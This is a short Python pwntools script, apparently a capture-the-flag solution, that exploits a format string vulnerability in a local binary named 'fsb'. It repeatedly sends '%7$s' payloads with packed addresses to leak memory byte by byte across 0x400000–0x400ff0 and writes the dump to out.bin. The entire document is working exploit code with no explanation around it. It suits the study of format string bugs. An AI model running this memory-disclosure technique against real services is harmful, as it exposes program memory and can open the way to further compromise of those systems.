from pwn import *
context.log_level="warn"
fd=open("out.bin","wb")
start_addr=0x400000
end_addr=0x400ff0
idx=0
s=process("./fsb")
while True:
    try:
        if((start_addr+idx)>end_addr):
            s.close()
            fd.close()
            break
        s=process("./fsb")
        print(hex(start_addr+idx))
        s.recvuntil("==\n")
        payload="%7$s#---"
        payload+=p64(start_addr+idx)
        if(((start_addr+idx)&0xff)==0x20 or (0x09<=((start_addr+idx)&0xff) and ((start_addr+idx)&0xff)<=0x0d)):
            fd.write('\x00')
            idx+=1
            s.close()
            continue
        s.sendline(payload)
        s.recvuntil(": ")
        res=s.recv().split("#")
        data=res[0]
        if(data==''):
            fd.write('\x00')
            print(hex(start_addr+idx)+' = '+repr(data))
            idx+=1
            s.close()
            continue
        fd.write(data)
        print(hex(start_addr+idx)+' = '+repr(data))
        idx+=len(data)
        s.close()
    except:
        s.close()
        s=process("./fsb")
        continue

